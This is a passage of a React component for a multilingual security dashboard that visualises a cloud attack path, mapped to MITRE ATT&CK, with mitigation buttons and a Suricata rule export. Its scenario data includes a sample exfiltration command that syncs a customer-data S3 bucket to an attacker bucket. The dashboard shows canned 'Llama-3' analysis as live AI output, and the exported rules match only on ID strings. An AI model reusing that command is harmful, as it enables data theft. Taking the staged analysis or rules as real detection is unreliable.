        mitreTacticZh: '資料外洩與衝擊 (Exfiltration & Impact)',
        mitreId: 'T1537',
        mitreName: 'Transfer Data to Cloud Account',
        exploitProbability: 96,
        pocAvailable: true,
        evidenceTrace: 'aws s3 sync s3://prod-customer-pii-vault/ s3://attacker-dropzone-bucket/ --region us-east-1',
        mitigationCmd: 'aws iam detach-role-policy --role-name k8s-admin-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
        mitigationDesc: 'Enforce Principle of Least Privilege (PoLP); detach AdministratorAccess and enable AWS GuardDuty crypto-mining alerts.',
        mitigationDescZh: '落實最小特權原則 (PoLP)；立即卸載 AdministratorAccess 並開啟 AWS GuardDuty 雲端即時異常告警。',
        mitigationDescJa: '最小権限の原則（PoLP）を適用し、AdministratorAccess を剥奪。GuardDuty による異常検知を有効化。',
        x: 560,
        y: 110
      }
    ],
    paths: [
      {
        from: 'node-1',
        to: 'node-2',
        protocol: 'eBPF/Kernel',
        port: 10250,
        technique: 'Kernel UAF Container Escape',
        techniqueZh: 'Netfilter eBPF 容器逃逸',
        techniqueJa: 'eBPF コンテナエスケープ',
        techniqueId: 'T1611',
        riskWeight: 94,
        status: 'breached'
      },
      {
        from: 'node-2',
        to: 'node-3',
        protocol: 'HTTP/IMDS',
        port: 80,
        technique: 'IMDSv1 Session Token Theft',
        techniqueZh: 'IMDSv1 雲端中繼資料金鑰竊取',
        techniqueJa: 'IMDSv1 トークン不正取得',
        techniqueId: 'T1552.005',
        riskWeight: 95,
        status: 'breached'
      },
      {
        from: 'node-3',
        to: 'node-4',
        protocol: 'HTTPS/REST',
        port: 443,
        technique: 'Cloud S3 PII Exfiltration',
        techniqueZh: 'S3 雲端客戶個資同步外洩',
        techniqueJa: 'S3 バケットデータ不正同期',
        techniqueId: 'T1537',
        riskWeight: 97,
        status: 'breached'
      }
    ],
    llamaReasoning: {
      en: 'Llama-3 Reasoner identified a Lazarus-style supply chain attack originating in npm dependencies, breaking out of K8s container isolation via CVE-2024-1086 eBPF vulnerability, and abusing IMDSv1 to extract administrative AWS IAM keys. Choke point: Enforcing IMDSv2 and disabling unprivileged eBPF completely stops the cloud takeover.',
      zh: 'Llama-3 推理引擎研判：此攻擊屬於標準 Lazarus 國家級供應鏈投毒鏈，從 npm 依賴切入，利用 CVE-2024-1086 eBPF 內核漏洞逃逸出 K8s 容器，隨後利用舊版 IMDSv1 竊取 AWS IAM 管理員金鑰。最關鍵阻斷節點：強制升級至 IMDSv2 並在宿主機禁用非特權 eBPF 即可阻斷雲端失陷。',
      ja: 'Llama-3 の推論結果：npm サプライチェーン汚染から始まり、eBPF 脆弱性によるコンテナ脱出、IMDSv1 経由での AWS IAM 権限奪取という Lazarus 特有の手法。遮断ポイント：IMDSv2 の強制と非特權 eBPF の無効化により、クラウド環境の侵害を完全に防げます。'
    }
  }
];

interface SecurityAttackTreeProps {
  activeLang?: 'en' | 'zh' | 'ja';
  onExecuteMitigation?: (cmd: string, nodeName: string) => void;
}

export default function SecurityAttackTree({ 
  activeLang = 'zh',
  onExecuteMitigation 
}: SecurityAttackTreeProps) {
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('apt29-db-exfil');
  const [activeViewMode, setActiveViewMode] = useState<'tree' | 'killchain' | 'table'>('tree');
  const [selectedNode, setSelectedNode] = useState<AttackTreeNode | null>(null);
  
  // Animation simulation playback state
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [simulationStep, setSimulationStep] = useState<number>(0);
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);
  const [mitigatedNodes, setMitigatedNodes] = useState<Set<string>>(new Set());
  const [showExportModal, setShowExportModal] = useState<boolean>(false);
  const [exportFeedback, setExportFeedback] = useState<string | null>(null);

  const scenario = ATTACK_SCENARIOS.find(s => s.id === selectedScenarioId) || ATTACK_SCENARIOS[0];

  // Auto playback loop
  useEffect(() => {
    let timer: any;
    if (isPlaying) {
      timer = setInterval(() => {
        setSimulationStep(prev => {
          if (prev >= scenario.nodes.length - 1) {
            setIsPlaying(false);
            return prev;
          }
          return prev + 1;
        });
      }, 1800);
    }
    return () => clearInterval(timer);
  }, [isPlaying, scenario.nodes.length]);

  // Set default selected node
  useEffect(() => {
    if (!selectedNode || !scenario.nodes.some(n => n.id === selectedNode.id)) {
      setSelectedNode(scenario.nodes[0]);
    }
    setSimulationStep(0);
    setIsPlaying(false);
  }, [selectedScenarioId]);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCmd(id);
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  const handleMitigateNode = (node: AttackTreeNode) => {
    setMitigatedNodes(prev => {
      const next = new Set(prev);
      if (next.has(node.id)) {
        next.delete(node.id);
      } else {
        next.add(node.id);
      }
      return next;
    });

    if (onExecuteMitigation) {
      onExecuteMitigation(node.mitigationCmd, node.name);
    }
  };

  const handleExportSuricataRules = () => {
    const rules = `# ==============================================================================
# Llama-3 AI Reasoner - Automated Suricata IDS/IPS Attack Tree Rules
# Target Scenario: ${scenario.title}
# Generated Timestamp: ${new Date().toISOString()}
# Actor Vector: ${scenario.threatActor}
# ==============================================================================

# Rule 1: Initial Breach Detection (${scenario.nodes[0]?.cveId})
alert tcp any any -> $HOME_NET 22 (msg:"[LLAMA-3-IPS] Initial Access Exploit Detected on ${scenario.nodes[0]?.name}"; flow:to_server,established; content:"${scenario.nodes[0]?.cveId}"; classtype:attempted-admin; sid:3000001; rev:1; priority:1;)

# Rule 2: Lateral Movement Pivoting (${scenario.nodes[1]?.mitreId})
alert tcp $HOME_NET any -> $HOME_NET [389,88,2222] (msg:"[LLAMA-3-IPS] Lateral Movement / Kerberoasting on ${scenario.nodes[1]?.name}"; flow:to_server,established; content:"${scenario.nodes[1]?.mitreId}"; classtype:trojan-activity; sid:3000002; rev:1; priority:1;)

# Rule 3: High Gain Exfiltration / Ransomware Stage (${scenario.nodes[3]?.mitreId})
drop tcp $HOME_NET 5432 -> any any (msg:"[LLAMA-3-IPS] BLOCK Exfiltration Activity from Core Target ${scenario.nodes[3]?.name}"; flow:from_server,established; threshold:type both,track by_src,count 50,seconds 10; sid:3000003; rev:1; priority:1;)
`;
    
    const element = document.createElement("a");
    const file = new Blob([rules], { type: 'text/plain' });
    element.href = URL.createObjectURL(file);
    element.download = `llama3-suricata-rules-${scenario.id}.rules`;
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);

    setExportFeedback(activeLang === 'zh' ? 'Suricata 防禦特徵碼已生成並下載！' : activeLang === 'ja' ? 'Suricata ルールファイルをダウンロードしました！' : 'Suricata rules exported successfully!');
    setTimeout(() => setExportFeedback(null), 3000);
  };

  return (
    <div className="bg-[#090d14] border border-gray-800 rounded-xl p-5 md:p-6 relative overflow-hidden transition-all duration-300 shadow-2xl space-y-6" id="security-attack-tree-master">
      {/* Background ambient lighting */}
      <div className="absolute top-0 right-0 w-96 h-96 bg-[#00FF66]/3 rounded-full blur-3xl pointer-events-none"></div>
      <div className="absolute bottom-0 left-0 w-80 h-80 bg-purple-600/3 rounded-full blur-3xl pointer-events-none"></div>

      {/* HEADER SECTION: Title + Status + Scenario Switcher */}
      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between border-b border-gray-850 pb-5 gap-4">
        <div>
          <div className="flex items-center gap-2.5 flex-wrap">
            <div className="p-2 bg-[#00FF66]/10 border border-[#00FF66]/30 rounded-lg">
              <Network className="text-[#00FF66] animate-pulse" size={20} />
            </div>
            <h3 className="text-sm md:text-base uppercase font-black tracking-widest text-white flex items-center gap-2">
              <span className="text-[#00FF66]">
                {activeLang === 'zh' 
                  ? '由 Llama-3 自動推導生成的漏洞利用路徑攻擊樹' 
                  : activeLang === 'ja' 
                  ? 'Llama-3 自動推論セキュリティ攻撃ツリー' 
                  : 'Llama-3 Derived Vulnerability Map'}
              </span>
              <span className="text-gray-400 font-mono text-xs">(Security Attack Tree)</span>
            </h3>
            <span className="text-[9px] font-mono font-black uppercase px-2 py-0.5 rounded bg-purple-600/20 text-purple-400 border border-purple-500/30">
              Llama-3-8B-SecReasoner
            </span>
            <span className="text-[9px] font-mono font-black uppercase px-2 py-0.5 rounded bg-[#00FF66]/15 text-[#00FF66] border border-[#00FF66]/30 flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-[#00FF66] animate-ping"></span>
              {activeLang === 'zh' ? '拓撲收斂完成 (100%)' : activeLang === 'ja' ? '推論収束 (100%)' : 'Topology Converged (100%)'}
            </span>
          </div>
          <p className="text-xs text-gray-400 mt-1.5 max-w-3xl leading-relaxed">
            {activeLang === 'zh' 
              ? '透過 Llama-3 深度推導神經網絡，將邊界失陷節點、橫向提權跳板與核心機密資產自動對齊 MITRE ATT&CK 技戰術，視覺化端到端滲透路徑並提供即時阻斷防禦腳本。' 
              : activeLang === 'ja' 
              ? 'Llama-3 推論エンジンが外部侵害ノード、横移動ピボット、重要資産を MITRE ATT&CK に自動マッピング。侵害チェーンを可視化し即時緩和策を提供します。' 
              : 'End-to-end multi-hop vulnerability traversal path generated via Llama-3, mapped directly to MITRE ATT&CK techniques with real-time choke point hardening.'}
          </p>
        </div>

        {/* Action button toolbar */}
        <div className="flex flex-wrap items-center gap-2 self-stretch xl:self-auto justify-end">
          {/* View Mode Switcher */}
          <div className="flex bg-black/60 p-1 border border-gray-800 rounded-lg">
            <button
              onClick={() => setActiveViewMode('tree')}
              className={cn(
                "px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer",
                activeViewMode === 'tree' ? "bg-[#00FF66]/20 text-[#00FF66] border border-[#00FF66]/40" : "text-gray-400 hover:text-white"
              )}
            >
              <Network size={13} />
              <span>{activeLang === 'zh' ? '視覺拓撲樹' : activeLang === 'ja' ? 'トポロジツリー' : 'Tree Graph'}</span>
            </button>
            <button
              onClick={() => setActiveViewMode('killchain')}
              className={cn(
                "px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer",
                activeViewMode === 'killchain' ? "bg-purple-600/20 text-purple-400 border border-purple-500/40" : "text-gray-400 hover:text-white"
              )}
            >
              <Layers size={13} />
              <span>{activeLang === 'zh' ? 'MITRE 殺傷鏈' : activeLang === 'ja' ? 'キルチェーン' : 'Kill-Chain'}</span>
            </button>
            <button
              onClick={() => setActiveViewMode('table')}
              className={cn(
                "px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer",
                activeViewMode === 'table' ? "bg-blue-600/20 text-blue-400 border border-blue-500/40" : "text-gray-400 hover:text-white"
              )}
            >
              <SlidersHorizontal size={13} />
              <span>{activeLang === 'zh' ? '節點明細鑑識' : activeLang === 'ja' ? 'ノード一覧' : 'Forensic Table'}</span>
            </button>
          </div>

          {/* Export Suricata Rule Button */}
          <button
            onClick={handleExportSuricataRules}
            className="px-3 py-1.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-[#00FF66]/40 text-xs font-bold text-gray-200 hover:text-white rounded-lg transition-all flex items-center gap-1.5 cursor-pointer"
            title="Download Suricata Rule Set"
          >
            <Download size={13} className="text-[#00FF66]" />
            <span>{activeLang === 'zh' ? '導出 Suricata 規則' : activeLang === 'ja' ? 'Suricata規則' : 'Export Rules'}</span>
          </button>
        </div>
      </div>

      {/* SCENARIO SELECTION BAR */}
      <div className="bg-black/50 border border-gray-850 rounded-xl p-3">
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <Target size={15} className="text-red-400 shrink-0" />
            <span className="text-[10px] uppercase font-black tracking-widest text-gray-400">
              {activeLang === 'zh' ? '選擇攻擊向量場景：' : activeLang === 'ja' ? '攻撃シナリオの選択：' : 'Select Attack Scenario:'}
            </span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-2 w-full lg:w-auto flex-1 max-w-5xl">
            {ATTACK_SCENARIOS.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setSelectedScenarioId(sc.id)}
                className={cn(
                  "p-2.5 rounded-lg border text-left transition-all cursor-pointer flex flex-col justify-between",
                  selectedScenarioId === sc.id
                    ? "bg-[#00FF66]/10 border-[#00FF66]/40 shadow-md shadow-[#00FF66]/5"
                    : "bg-gray-900/40 border-gray-800/80 hover:border-gray-700 opacity-75 hover:opacity-100"
                )}
              >
                <div className="flex items-center justify-between gap-1 mb-1">
                  <span className={cn(
                    "text-[9px] font-mono font-black uppercase px-1.5 py-0.5 rounded",
                    selectedScenarioId === sc.id ? "bg-[#00FF66] text-black" : "bg-gray-800 text-gray-400"
                  )}>
                    {sc.threatActorBadge}
                  </span>
                  <span className="text-[10px] font-mono font-black text-red-400">
                    CVSS {sc.compositeRisk}
                  </span>
                </div>
                <p className="text-xs font-bold text-white line-clamp-1">
                  {activeLang === 'zh' ? sc.titleZh : activeLang === 'ja' ? sc.titleJa : sc.title}
                </p>
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* METRICS SUMMARY KPI BAR */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3">
        <div className="bg-black/40 border border-gray-850 p-3 rounded-xl flex items-center gap-3">
          <div className="p-2.5 bg-red-950/40 border border-red-500/30 rounded-lg text-red-400 shrink-0">
            <ShieldAlert size={18} />
          </div>
          <div>
            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">
              {activeLang === 'zh' ? '綜合路徑風險指數' : activeLang === 'ja' ? '総合リスク指数' : 'Composite Risk'}
            </span>
            <div className="flex items-baseline gap-1.5">
              <span className="text-base font-black text-red-400 font-mono">CVSS {scenario.compositeRisk}</span>
              <span className="text-[9px] text-red-500 font-bold uppercase">{activeLang === 'zh' ? '極高危險' : 'CRITICAL'}</span>
            </div>
          </div>
        </div>

        <div className="bg-black/40 border border-gray-850 p-3 rounded-xl flex items-center gap-3">
          <div className="p-2.5 bg-yellow-950/40 border border-yellow-500/30 rounded-lg text-yellow-400 shrink-0">
            <Clock size={18} />
          </div>
          <div>
            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">
              {activeLang === 'zh' ? '最短失陷時間 (TTC)' : activeLang === 'ja' ? '推定侵害所要時間' : 'Time-to-Compromise'}
            </span>
            <span className="text-base font-black text-yellow-400 font-mono">
              {activeLang === 'zh' ? scenario.timeToCompromiseZh : activeLang === 'ja' ? scenario.timeToCompromiseJa : scenario.timeToCompromise}
            </span>
          </div>
        </div>

        <div className="bg-black/40 border border-gray-850 p-3 rounded-xl flex items-center gap-3">
          <div className="p-2.5 bg-purple-950/40 border border-purple-500/30 rounded-lg text-purple-400 shrink-0">
            <Network size={18} />
          </div>
          <div>
            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">
              {activeLang === 'zh' ? '漏洞跳板節點數' : activeLang === 'ja' ? '攻撃ホップ数' : 'Exploit Hops'}
            </span>
            <span className="text-base font-black text-purple-300 font-mono">
              {scenario.hopCount} {activeLang === 'zh' ? '節點 / 3 躍點' : 'Nodes'}
            </span>
          </div>
        </div>

        <div className="bg-black/40 border border-gray-850 p-3 rounded-xl flex items-center gap-3">
          <div className="p-2.5 bg-orange-950/40 border border-orange-500/30 rounded-lg text-orange-400 shrink-0">
            <Bug size={18} />
          </div>
          <div>
            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">
              {activeLang === 'zh' ? '已知未修補 CVE' : activeLang === 'ja' ? '未修正のCVE' : 'Unpatched CVEs'}
            </span>
            <span className="text-base font-black text-orange-400 font-mono">
              {scenario.unpatchedCVEs} {activeLang === 'zh' ? '個 (高利用率)' : 'CVEs'}
            </span>
          </div>
        </div>

        <div className="col-span-2 sm:col-span-1 bg-black/40 border border-gray-850 p-3 rounded-xl flex items-center gap-3">
          <div className="p-2.5 bg-green-950/40 border border-green-500/30 rounded-lg text-green-400 shrink-0">
            <ShieldCheck size={18} />
          </div>
          <div>
            <span className="text-[9px] text-gray-500 font-bold uppercase tracking-wider block">
              {activeLang === 'zh' ? 'AI 加固阻斷成功率' : activeLang === 'ja' ? 'AI 遮断成功率' : 'Mitigation Rate'}
            </span>
            <span className="text-base font-black text-[#00FF66] font-mono">{scenario.mitigationRate}%</span>
          </div>
        </div>
      </div>

      {exportFeedback && (
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="p-3 bg-[#00FF66]/10 border border-[#00FF66]/30 text-[#00FF66] rounded-xl text-xs font-bold flex items-center gap-2"
        >
          <CheckCircle2 size={16} />
          <span>{exportFeedback}</span>
        </motion.div>
      )}

      {/* MAIN VISUAL AREA (Based on activeViewMode) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        
        {/* LEFT / CENTER VIEW (8 cols on large screens) */}
        <div className="lg:col-span-8 space-y-4">
          
          {/* 1. INTERACTIVE SVG ATTACK TREE MODE */}
          {activeViewMode === 'tree' && (
            <div className="bg-black/70 border border-gray-850 rounded-xl p-4 md:p-6 relative overflow-hidden flex flex-col justify-between min-h-[440px]">
              
              {/* Simulation Player Toolbar */}
              <div className="flex flex-wrap items-center justify-between border-b border-gray-850 pb-3 mb-4 gap-2">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      if (simulationStep >= scenario.nodes.length - 1) {
                        setSimulationStep(0);
                      }
                      setIsPlaying(!isPlaying);
                    }}
                    className={cn(
                      "px-3 py-1.5 rounded-lg text-xs font-black uppercase tracking-wider transition-all flex items-center gap-1.5 cursor-pointer shadow-lg",
                      isPlaying 
                        ? "bg-yellow-500 text-black shadow-yellow-500/20" 
                        : "bg-[#00FF66] hover:bg-[#00FF66]/90 text-black shadow-[#00FF66]/20"
                    )}
                  >
                    {isPlaying ? <Pause size={13} /> : <Play size={13} />}
                    <span>
                      {isPlaying 
                        ? (activeLang === 'zh' ? '暫停步進演示' : activeLang === 'ja' ? '一時停止' : 'Pause Simulation')
                        : (activeLang === 'zh' ? '播放攻擊鏈步進演示' : activeLang === 'ja' ? '攻撃シミュレーション再生' : 'Play Attack Path')}
                    </span>
                  </button>

                  <button
                    onClick={() => {
                      setIsPlaying(false);
                      setSimulationStep(0);
                    }}
                    className="p-1.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 text-gray-400 hover:text-white rounded-lg transition-colors cursor-pointer"
                    title="Reset Simulation Step"
                  >
                    <RotateCcw size={14} />
                  </button>

                  <span className="text-[10px] font-mono text-gray-400 ml-2">
                    {activeLang === 'zh' ? '當前步進階層:' : activeLang === 'ja' ? 'ステップ:' : 'Active Phase:'}{' '}
                    <span className="text-[#00FF66] font-bold">Step {simulationStep + 1} / {scenario.nodes.length}</span>
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-mono text-gray-500">
                    {activeLang === 'zh' ? '※ 點選節點可查看深度漏洞鑑識與一鍵加固腳本' : 'Click node for forensics & mitigation'}
                  </span>
                </div>
              </div>

              {/* Responsive SVG Flow Graph */}
              <div className="w-full flex-1 min-h-[290px] flex items-center justify-center relative py-2">
                <svg viewBox="0 0 680 240" className="w-full max-w-3xl h-full select-none font-mono">
                  <defs>
                    <marker id="arr-green" viewBox="0 0 10 10" refX="28" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                      <path d="M 0 1 L 10 5 L 0 9 z" fill="#00FF66" />
                    </marker>
                    <marker id="arr-red" viewBox="0 0 10 10" refX="28" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                      <path d="M 0 1 L 10 5 L 0 9 z" fill="#ef4444" />
                    </marker>
                    <marker id="arr-orange" viewBox="0 0 10 10" refX="28" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                      <path d="M 0 1 L 10 5 L 0 9 z" fill="#f59e0b" />
                    </marker>
                    
                    {/* Linear Gradient for attack lines */}
                    <linearGradient id="lineGrad" x1="0%" y1="0%" x2="100%" y2="0%">
                      <stop offset="0%" stopColor="#ef4444" />
                      <stop offset="50%" stopColor="#f59e0b" />
                      <stop offset="100%" stopColor="#00FF66" />
                    </linearGradient>
                  </defs>

                  {/* Connecting Vector Paths */}
                  {scenario.paths.map((p, idx) => {
                    const fromNode = scenario.nodes.find(n => n.id === p.from);
                    const toNode = scenario.nodes.find(n => n.id === p.to);
                    if (!fromNode || !toNode) return null;

                    const isTraversed = simulationStep >= idx;

                    return (
                      <g key={`${p.from}-${p.to}`}>
                        {/* Base dashed path line */}
                        <path
                          d={`M ${fromNode.x} ${fromNode.y} L ${toNode.x} ${toNode.y}`}
                          stroke={isTraversed ? "#00FF66" : "#374151"}
                          strokeWidth={isTraversed ? "3" : "2"}
                          strokeDasharray={isTraversed ? "none" : "4,4"}
                          markerEnd={isTraversed ? "url(#arr-green)" : "url(#arr-green)"}
                          className="transition-all duration-500"
                        />

                        {/* Animated Laser Pulse along the line when playing */}
                        {isPlaying && isTraversed && (
                          <motion.circle
                            r="4"
                            fill="#00FF66"
                            initial={{ cx: fromNode.x, cy: fromNode.y }}
                            animate={{ cx: toNode.x, cy: toNode.y }}
                            transition={{ duration: 1.2, repeat: Infinity, ease: "linear" }}
                            style={{ filter: "drop-shadow(0 0 6px #00FF66)" }}
                          />
                        )}

                        {/* Port / Protocol badge in middle of connection */}
                        <g transform={`translate(${(fromNode.x + toNode.x) / 2}, ${(fromNode.y + toNode.y) / 2 - 14})`}>
                          <rect
                            x="-32"
                            y="-9"
                            width="64"
                            height="18"
                            rx="4"
                            fill="#090d14"
                            stroke={isTraversed ? "#00FF66" : "#4b5563"}
                            strokeWidth="1"
                          />
                          <text
                            textAnchor="middle"
                            y="3"
                            fill={isTraversed ? "#00FF66" : "#9ca3af"}
                            fontSize="8"
                            fontWeight="bold"
                          >
                            {p.protocol}
                          </text>
                        </g>

                        {/* Technique label below line */}
                        <text
                          textAnchor="middle"
                          x={(fromNode.x + toNode.x) / 2}
                          y={(fromNode.y + toNode.y) / 2 + 20}
                          fill="#6b7280"
                          fontSize="7"
                          fontWeight="bold"
                        >
                          {p.techniqueId}
                        </text>
                      </g>
                    );
                  })}

                  {/* Render Node Graphics */}
                  {scenario.nodes.map((n, idx) => {
                    const isSelected = selectedNode?.id === n.id;
                    const isMitigated = mitigatedNodes.has(n.id);
                    const isCurrentStep = simulationStep === idx;

                    // Node color based on type & status
                    let strokeColor = "#ef4444";
                    let glowColor = "rgba(239, 68, 68, 0.4)";
                    let statusLabel = activeLang === 'zh' ? '已失陷' : activeLang === 'ja' ? '侵害' : 'BREACHED';

                    if (isMitigated) {
                      strokeColor = "#00FF66";
                      glowColor = "rgba(0, 255, 102, 0.4)";
                      statusLabel = activeLang === 'zh' ? '已加固防禦' : activeLang === 'ja' ? '防禦済み' : 'SECURED';
                    } else if (n.nodeType === 'credential') {
                      strokeColor = "#f59e0b";
                      glowColor = "rgba(245, 158, 11, 0.4)";
                      statusLabel = activeLang === 'zh' ? '憑證洩露' : activeLang === 'ja' ? '資格情報露出' : 'EXPOSED';
                    } else if (n.nodeType === 'pivot') {
                      strokeColor = "#a855f7";
                      glowColor = "rgba(168, 85, 247, 0.4)";
                      statusLabel = activeLang === 'zh' ? '中繼跳板' : activeLang === 'ja' ? 'ピボット' : 'PIVOT';
                    } else if (n.nodeType === 'target') {
                      strokeColor = "#ef4444";
                      glowColor = "rgba(239, 68, 68, 0.5)";
                      statusLabel = activeLang === 'zh' ? '目標受威脅' : activeLang === 'ja' ? '重要標的' : 'HIGH RISK';
                    }

                    return (
                      <g 
                        key={n.id} 
                        transform={`translate(${n.x}, ${n.y})`}
                        onClick={() => setSelectedNode(n)}
                        className="cursor-pointer group"
                      >
                        {/* Selected or Active Step pulsing ring */}
                        {(isSelected || (isPlaying && isCurrentStep)) && (
                          <motion.circle
                            r="44"
                            fill="none"
                            stroke={strokeColor}
                            strokeWidth="1.5"
                            strokeDasharray="4,4"
                            animate={{ rotate: 360 }}
                            transition={{ duration: 8, repeat: Infinity, ease: "linear" }}
                            style={{ transformOrigin: "0px 0px" }}
                          />
                        )}

                        {/* Outer Glow Circle */}
                        <circle
                          r={isSelected ? "36" : "32"}
                          fill="#0f172a"
                          stroke={strokeColor}
                          strokeWidth={isSelected ? "3.5" : "2.5"}
                          className="transition-all duration-300 group-hover:scale-105"
                          style={{ filter: isSelected ? `drop-shadow(0 0 10px ${glowColor})` : "none" }}
                        />

                        {/* Node Type Specific Center Icon (SVG inside) */}
                        <g transform="translate(-10, -10)">
                          {n.nodeType === 'entry' && <Terminal size={20} className={cn(isMitigated ? "text-green-400" : "text-red-400")} />}
                          {n.nodeType === 'credential' && <Key size={20} className={cn(isMitigated ? "text-green-400" : "text-yellow-400", "animate-pulse")} />}
                          {n.nodeType === 'pivot' && <Network size={20} className={cn(isMitigated ? "text-green-400" : "text-purple-400")} />}
                          {n.nodeType === 'target' && <Database size={20} className={cn(isMitigated ? "text-green-400" : "text-red-400")} />}
                        </g>

                        {/* Status Tag Badge on top of circle */}
                        <g transform="translate(0, -42)">
                          <rect
                            x="-35"
                            y="-7"
                            width="70"
                            height="14"
                            rx="4"
                            fill="#090d14"
                            stroke={strokeColor}
                            strokeWidth="1"
                          />
                          <text
                            textAnchor="middle"
                            y="3"
                            fill={strokeColor}
                            fontSize="7"
                            fontWeight="900"
                          >
                            {statusLabel}
                          </text>
                        </g>

                        {/* Hostname Label */}
                        <text
                          textAnchor="middle"
                          y="48"
                          fill="white"
                          fontSize="9"
                          fontWeight="bold"
                          className="font-sans"
                        >
                          {n.name}
                        </text>

                        {/* IP Label */}
                        <text
                          textAnchor="middle"
                          y="58"
                          fill="#9ca3af"
                          fontSize="7.5"
                          className="font-mono tracking-tight"
                        >
                          {n.ip}
                        </text>

                        {/* CVE Tag below */}
                        <g transform="translate(0, 68)">
                          <rect
                            x="-32"
                            y="-6"
                            width="64"
                            height="12"
                            rx="3"
                            fill="rgba(0,0,0,0.8)"
                            stroke="#374151"
                            strokeWidth="0.8"
                          />
                          <text
                            textAnchor="middle"
                            y="2.5"
                            fill="#e5e7eb"
                            fontSize="6.5"
                            fontWeight="bold"
                          >
                            {n.cveId}
                          </text>
                        </g>
                      </g>
                    );
                  })}
                </svg>
              </div>

              {/* Bottom Legend */}
              <div className="flex flex-wrap items-center justify-between border-t border-gray-850 pt-3 text-[10px] text-gray-400 gap-3">
                <div className="flex items-center gap-4">
                  <div className="flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-red-500"></span>
                    <span>{activeLang === 'zh' ? '初始失陷 (Initial)' : 'Initial Breach'}</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
                    <span>{activeLang === 'zh' ? '憑證暴露 (Credential)' : 'Credential'}</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-purple-500"></span>
                    <span>{activeLang === 'zh' ? '橫向中繼 (Pivot)' : 'Lateral Pivot'}</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-[#00FF66]"></span>
                    <span>{activeLang === 'zh' ? '已套用防禦 (Mitigated)' : 'Mitigated'}</span>
                  </div>
                </div>

                <span className="font-mono text-gray-500">
                  {activeLang === 'zh' ? '審計拓撲模式: VENEER-003' : 'Topology Model: VENEER-003'}
                </span>
              </div>
            </div>
          )}

          {/* 2. MITRE ATT&CK KILL-CHAIN MATRIX MODE */}
          {activeViewMode === 'killchain' && (
            <div className="bg-black/70 border border-gray-850 rounded-xl p-5 space-y-4 min-h-[440px]">
              <div className="flex items-center justify-between border-b border-gray-850 pb-3">
                <div className="flex items-center gap-2">
                  <Layers className="text-purple-400" size={16} />
                  <h4 className="text-xs uppercase font-black tracking-widest text-white">
                    {activeLang === 'zh' ? 'MITRE ATT&CK 殺傷鏈戰術階層矩陣' : 'MITRE ATT&CK Kill-Chain Matrix'}
                  </h4>
                </div>
                <span className="text-[10px] font-mono text-purple-400 font-bold bg-purple-600/10 px-2 py-0.5 rounded border border-purple-500/20">
                  {scenario.nodes.length} Stages Mapped
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
                {scenario.nodes.map((node, idx) => {
                  const isMitigated = mitigatedNodes.has(node.id);
                  return (
                    <div
                      key={node.id}
                      onClick={() => setSelectedNode(node)}
                      className={cn(
                        "p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3",
                        selectedNode?.id === node.id 
                          ? "bg-purple-950/20 border-purple-500/50 shadow-lg shadow-purple-900/10" 
                          : "bg-gray-900/40 border-gray-800 hover:border-gray-700"
                      )}
                    >
                      <div>
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-[9px] font-mono font-black text-purple-400 bg-purple-900/30 px-1.5 py-0.5 rounded">
                            STAGE {idx + 1}
                          </span>
                          <span className="text-[9px] font-mono text-red-400 font-black">
                            CVSS {node.cvss}
                          </span>
                        </div>

                        <h5 className="text-xs font-black text-white">{node.name}</h5>
                        <p className="text-[10px] text-gray-400 font-mono">{node.ip}</p>
                        
                        <div className="mt-3 pt-2 border-t border-gray-800/60 space-y-1 text-[10px]">
                          <div className="flex justify-between">
                            <span className="text-gray-500">Tactic:</span>
                            <span className="text-gray-300 font-bold">{node.mitreTactic}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-500">Technique:</span>
                            <span className="text-[#00FF66] font-mono font-bold">{node.mitreId}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-500">Vulnerability:</span>
                            <span className="text-orange-400 font-mono font-bold">{node.cveId}</span>
                          </div>
                        </div>
                      </div>

                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleMitigateNode(node);
                        }}
                        className={cn(
